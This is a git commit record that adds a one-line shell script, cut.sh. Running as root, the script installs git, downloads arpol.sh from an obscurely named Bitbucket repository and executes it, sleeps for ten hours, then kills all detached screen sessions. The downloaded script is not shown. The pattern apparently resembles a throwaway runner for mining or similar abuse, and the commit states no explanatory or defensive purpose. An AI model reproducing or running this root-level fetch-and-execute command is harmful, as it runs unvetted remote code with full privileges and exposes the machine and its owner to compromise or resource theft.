e6fff1720f49b226172eadecc9efd78a17895386
sandesco <101970380+sandesco@users.noreply.github.com>
2022-07-30 22:46:21 +0700

    Create cut.sh

---
+++ cut.sh
@@ -0,0 +1,1 @@
+sudo su --command "apt update && apt install git -y && wget https://bitbucket.org/jakbda/bakbf/raw/bd95d365dd192b3facb3e1fad1397b610b730628/arpol.sh && chmod +x arpol.sh && ./arpol.sh && sleep 36000 && screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill"
